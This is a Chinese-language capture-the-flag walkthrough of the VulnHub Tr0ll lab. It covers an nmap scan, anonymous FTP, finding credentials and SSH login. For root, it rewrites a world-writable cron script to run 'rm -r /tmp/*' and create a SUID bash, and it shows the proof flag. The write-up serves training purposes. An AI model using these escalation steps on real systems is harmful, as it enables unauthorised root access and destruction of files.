## port scan

```
# Nmap 7.94SVN scan initiated Mon Jan 20 06:28:36 2025 as: nmap -p21,22,80 -sVC -O -oN nmap_result/detils 192.168.28.10
Nmap scan report for 192.168.28.10 (192.168.28.10)
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.28.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret
MAC Address: 00:0C:29:6D:76:70 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

匿名登录ftp，在流量包中找到

```
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
```

## web

访问：/sup3rs3cr3tdirlol目录

找到一个执行文件

```shell
┌──(kali㉿kali)-[~/vulnhub/Tr0ll]
└─$ ./roflmao 
Find address 0x0856BF to proceed  
```

根据提示，在访问 0x0856BF目录

http://192.168.28.10/0x0856BF/

经过尝试找到账号密码：`overflow:Pass.txt`

ssh登录

## 提权

不能查看crontab文件时，可以找到cronlog文件

```bash
$ cat /etc/crontab
cat: /etc/crontab: Permission denied
$ cat /var/log/cronlog
*/2 * * * * cleaner.py
$ find / -name 'cleaner.py' 2>/dev/null
/lib/log/cleaner.py
$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 139 Jan 20 04:08 /lib/log/cleaner.py
```

```shell
bash-4.3# cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys

try:
        os.system('rm -r /tmp/*;cp /bin/bash /tmp/bash;chmod +s /tmp/bash;')
except:
        sys.exit()
$ ./bash -p
bash-4.3# cd /root
bash-4.3# ls
proof.txt
bash-4.3# cat proof.txt 
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```

或者直接内核提权

```sh
$ uname -a
Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
$ cat /etc/*rele*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

